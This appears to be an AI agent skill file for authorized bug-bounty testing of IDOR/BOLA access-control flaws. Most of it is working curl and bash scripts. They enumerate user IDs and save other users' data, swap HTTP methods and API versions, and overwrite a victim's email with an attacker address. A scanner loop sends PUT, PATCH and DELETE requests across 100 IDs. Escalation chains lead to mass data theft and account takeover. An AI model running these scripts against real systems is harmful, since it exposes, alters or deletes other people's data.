---
name: hunt-idor
description: IDOR/BOLA hunting with mandatory differential testing. Two-session comparison, privilege escalation matrix, state change verification. Every candidate must pass the 7-gate validation before reporting. Optimized for validated findings per hour.
---

# IDOR/BOLA HUNTING — DIFFERENTIAL TESTING METHOD

**IDOR is the #1 most paid web2 bug class — but only if you prove the security boundary violation.**

---

## HYPOTHESIS GENERATION

Before testing, generate structured hypotheses:

```
HYPOTHESIS: IDOR on [endpoint]
  Endpoint: [METHOD] [URL with {id}]
  Precondition: Authenticated as user A
  Expected: User A can only access resource A
  Attack: User A accesses resource B (user B's resource)
  Impact: Confidentiality breach / Integrity violation
  Confidence: [HIGH/MEDIUM/LOW]
  Priority: [impact × exploitability × confidence]
```

---

## THE DIFFERENTIAL TESTING METHOD

### Core Principle

> **The vulnerability is not that the endpoint returns 200. The vulnerability is that it returns 200 for a DIFFERENT user's resource when it shouldn't.**

### Two-Session Differential — The Gold Standard

```
TEST MATRIX:
  User A → resource A  (baseline — should work, expect 200 + data)
  User A → resource B  (test — should FAIL, expect 403/404/empty)
  User B → resource A  (test — should FAIL, expect 403/404/empty)
  unauthenticated → resource A  (test — should FAIL, expect 401/403)

FINDING: If User A can access User B's resource → IDOR CONFIRMED
NOT A FINDING: If all cross-user requests fail identically
```

### Implementation

```bash
# SETUP: Two accounts needed
TOKEN_A="attacker-session-token"   # User A (low privilege)
TOKEN_B="victim-session-token"     # User B (has data we want)
VICTIM_ID="user-B-resource-id"     # Resource belonging to User B

# STEP 1: Baseline — User A reads own data (should succeed)
echo "=== BASELINE: User A → Own Resource ==="
curl -s -H "Authorization: Bearer $TOKEN_A" \
  "https://target.com/api/users/me" | python3 -m json.tool
# EXPECTED: Returns User A's data

# STEP 2: Differential — User A reads User B's resource
echo "=== DIFFERENTIAL: User A → User B's Resource ==="
curl -s -H "Authorization: Bearer $TOKEN_A" \
  "https://target.com/api/users/$VICTIM_ID" | python3 -m json.tool
# EXPECTED: 403/404/error
# IF RETURNS USER B'S DATA → IDOR CONFIRMED

# STEP 3: Compare responses
# DIFFERENCE = vulnerability
# Same response for both → NO VULN
# Different response (200 vs 403) → CORRECTLY PROTECTED
# Same response (200 for both) → IDOR VULN
```

---

## ENUMERATION TECHNIQUES

### Numeric ID Enumeration

```bash
# Sequential scan
for id in $(seq 1 1000); do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN_A" \
    "https://target.com/api/users/$id")
  
  if [ "$response" == "200" ]; then
    echo "[+] ID $id accessible → possible IDOR"
    # Capture the data for differential comparison
    curl -s -H "Authorization: Bearer $TOKEN_A" \
      "https://target.com/api/users/$id" > "user_$id.json"
  fi
done

# COMPARE: Do the captured responses contain different users' data?
# If user_1.json and user_2.json have different data → IDOR CONFIRMED
```

### UUID Enumeration

```bash
# Find UUIDs from other endpoints (sharing links, email invites, API responses)
curl -s -H "Authorization: Bearer $TOKEN_A" \
  "https://target.com/api/users" | \
  grep -oE "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" | \
  sort -u > uuids.txt

# Test each UUID
for uuid in $(cat uuids.txt); do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN_A" \
    "https://target.com/api/users/$uuid")
  
  if [ "$response" == "200" ]; then
    echo "[+] UUID $uuid accessible"
  fi
done
```

### HTTP Method Swap Differential

```bash
# Test ALL methods on the same endpoint
METHODS=("GET" "POST" "PUT" "DELETE" "PATCH" "OPTIONS" "HEAD")

echo "=== METHOD SWAP TEST ==="
for method in "${METHODS[@]}"; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -X $method \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    "https://target.com/api/users/$VICTIM_ID")
  
  echo "$method → $response"
  
  # DIFFERENTIAL: If GET returns 403 but PUT returns 200 → method-based IDOR
done
```

### Old API Version Differential

```bash
# Test v1 vs v2 — old versions often lack auth controls
echo "=== VERSION DIFFERENTIAL ==="
echo "--- v2 (current) ---"
curl -s -o /dev/null -w "v2: %{http_code}\n" \
  -H "Authorization: Bearer $TOKEN_A" \
  "https://target.com/api/v2/users/$VICTIM_ID"

echo "--- v1 (old) ---"
curl -s -o /dev/null -w "v1: %{http_code}\n" \
  -H "Authorization: Bearer $TOKEN_A" \
  "https://target.com/api/v1/users/$VICTIM_ID"

# DIFFERENTIAL: If v2 returns 403 but v1 returns 200 → version-based IDOR
```

### Parameter Pollution

```bash
# Test with user_id in different positions
echo "=== PARAMETER POSITION TEST ==="

# In query string
curl -s -H "Authorization: Bearer $TOKEN_A" \
  "https://target.com/api/orders?user_id=$VICTIM_ID"

# In JSON body
curl -s -X POST -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d "{\"user_id\":\"$VICTIM_ID\"}" \
  "https://target.com/api/orders"

# In custom header
curl -s -H "Authorization: Bearer $TOKEN_A" \
  -H "X-User-Id: $VICTIM_ID" \
  "https://target.com/api/orders"

# DIFFERENTIAL: If any position returns victim's data → IDOR
```

### GraphQL IDOR

```bash
# node() query — change the base64-encoded ID
VICTIM_B64=$(echo -n "User:$VICTIM_ID" | base64)

curl -s -X POST -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d "{\"query\":\"{ node(id: \\\"$VICTIM_B64\\\") { email name } }\"}" \
  "https://target.com/graphql"

# Alias-based batch IDOR (fetch multiple users in one request)
curl -s -X POST -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ a1: user(id: \"1\") { email } a2: user(id: \"2\") { email } a3: user(id: \"3\") { email } }"}' \
  "https://target.com/graphql"

# DIFFERENTIAL: If you get other users' data → IDOR via GraphQL
```

---

## PRIVILEGE ESCALATION MATRIX

### Vertical IDOR (Low → High)

```
TEST MATRIX:
  low_priv_token → admin_endpoint (should FAIL)
  admin_token → admin_endpoint (should SUCCEED)
  low_priv_token + admin_header (should FAIL)

FINDING: If low_priv succeeds → vertical IDOR / privilege escalation
```

```bash
# Test admin endpoints with low-priv token
ADMIN_ENDPOINTS=(
  "/api/admin/users"
  "/api/admin/settings"
  "/api/admin/config"
  "/admin/dashboard"
  "/api/v1/admin/users"
)

for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $LOW_PRIV_TOKEN" \
    "https://target.com$endpoint")
  
  echo "$endpoint → $response"
  
  if [ "$response" == "200" ]; then
    echo "[+] VERTICAL IDOR: Low-priv user can access $endpoint"
    curl -s -H "Authorization: Bearer $LOW_PRIV_TOKEN" \
      "https://target.com$endpoint" | head -20
  fi
done
```

---

## STATE CHANGE VERIFICATION

### Before → Attack → After

```bash
# STEP 1: Record state BEFORE
echo "=== STATE BEFORE ==="
curl -s -H "Authorization: Bearer $TOKEN_A" \
  "https://target.com/api/users/$VICTIM_ID" | python3 -m json.tool
# Save: {"email": "victim@example.com", "name": "Victim"}

# STEP 2: Execute attack — try to modify victim's data
echo "=== ATTACK ==="
curl -s -X PUT -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}' \
  "https://target.com/api/users/$VICTIM_ID"

# STEP 3: Record state AFTER
echo "=== STATE AFTER ==="
curl -s -H "Authorization: Bearer $TOKEN_B" \
  "https://target.com/api/users/$VICTIM_ID" | python3 -m json.tool

# DIFFERENTIAL: If email changed → WRITE IDOR CONFIRMED
# If state unchanged → correctly protected (or read-only IDOR)
```

---

## GATE VALIDATION CHECKLIST

Before reporting ANY IDOR finding, verify:

### Gate 1 — Scope
- [ ] The affected endpoint is in program scope

### Gate 2 — Security Boundary
- [ ] Cross-user access was demonstrated (User A accessed User B's resource)
- [ ] The boundary violated is clearly documented

### Gate 3 — Attacker Capability
- [ ] Starting position is realistic (authenticated normal user)
- [ ] No unrealistic prerequisites required

### Gate 4 — Reproducibility
- [ ] Two accounts prepared (attacker + victim)
- [ ] Exact HTTP request captured
- [ ] Exact response captured showing victim's data
- [ ] Steps are reproducible by a triager

### Gate 5 — Impact
- [ ] Select impact: Confidentiality / Integrity / Authorization
- [ ] Quantify: "can access N users' data" or "can modify N users' data"
- [ ] Data type identified: PII / financial / messages / etc.

### Gate 6 — False Positive Elimination
- [ ] Response contains ACTUAL different user's data (not empty/null/mock)
- [ ] Same request with victim's token also works (resource exists)
- [ ] Not a public endpoint by design
- [ ] Not the same user's own data (verify IDs differ)

### Gate 7 — Program Acceptance
- [ ] Bug class is in scope
- [ ] Severity meets minimum threshold
- [ ] Checked Hacktivity for duplicates
- [ ] PoC meets program requirements

---

## SEVERITY ASSESSMENT

| IDOR Type | Impact | Typical Severity |
|-----------|--------|-----------------|
| Read other user's PII (email, name, phone) | Data breach | Medium-High |
| Read other user's financial data | Financial impact | High-Critical |
| Modify other user's data | Data manipulation | High |
| Delete other user's data | Data destruction | High |
| Read admin data | Privilege escalation | High |
| Admin endpoint access | System compromise | Critical |
| Mass enumeration of all users | Mass data exfil | Critical |

---

## ESCALATION CHAINS

```
IDOR (read) → enumerate all users → mass PII exfil → Critical
IDOR (read) → find admin user → IDOR on admin endpoint → Critical
IDOR (write) → change victim email → password reset → ATO → Critical
IDOR (read) → find API keys in user data → infrastructure access → Critical
IDOR (read) → find payment data → financial fraud → Critical
```

---

## COMMON FALSE POSITIVES TO AVOID

```
FALSE POSITIVE: "Endpoint returns 200 for different IDs"
REALITY: If the response contains the SAME user's data for all IDs
  → It's not IDOR, the ID might be a session reference, not a resource ID
  → VERIFY: Response must contain DIFFERENT data for different IDs

FALSE POSITIVE: "I can access /api/users/me with any ID"
REALITY: /api/users/me might resolve to the authenticated user regardless
  → VERIFY: Test with a specific numeric/UUID ID, not /me

FALSE POSITIVE: "Endpoint returns 200 without auth"
REALITY: Might return empty data or public profile
  → VERIFY: Must return SENSITIVE data that belongs to another user
```

---

## AUTOMATED IDOR SCANNER

```bash
#!/bin/bash
TARGET=$1
ENDPOINT=$2
TOKEN_A=$3
TOKEN_B=$4
VICTIM_ID=$5

echo "=== IDOR DIFFERENTIAL SCAN: $ENDPOINT ==="

# Test numeric IDs
for id in $(seq 1 100); do
  for method in GET PUT PATCH DELETE; do
    # User A's request
    resp_a=$(curl -s -X $method \
      -H "Authorization: Bearer $TOKEN_A" \
      -H "Content-Type: application/json" \
      "$TARGET$ENDPOINT/$id" -w "\n%{http_code}")
    
    status_a=$(echo "$resp_a" | tail -1)
    body_a=$(echo "$resp_a" | head -n -1)
    
    if [ "$status_a" == "200" ]; then
      # Check if it's a DIFFERENT user's data
      echo "[+] $method $ENDPOINT/$id → $status_a"
      
      # Compare with victim's own request
      resp_v=$(curl -s -X $method \
        -H "Authorization: Bearer $TOKEN_B" \
        "$TARGET$ENDPOINT/$id" -w "\n%{http_code}")
      
      status_v=$(echo "$resp_v" | tail -1)
      body_v=$(echo "$resp_v" | head -n -1)
      
      if [ "$status_v" == "200" ] && [ "$body_a" != "$body_v" ]; then
        echo "[!] IDOR CONFIRMED: Different responses for same resource"
        echo "    Attacker sees: $(echo $body_a | head -c 100)"
        echo "    Victim sees: $(echo $body_v | head -c 100)"
      fi
    fi
  done
done
```
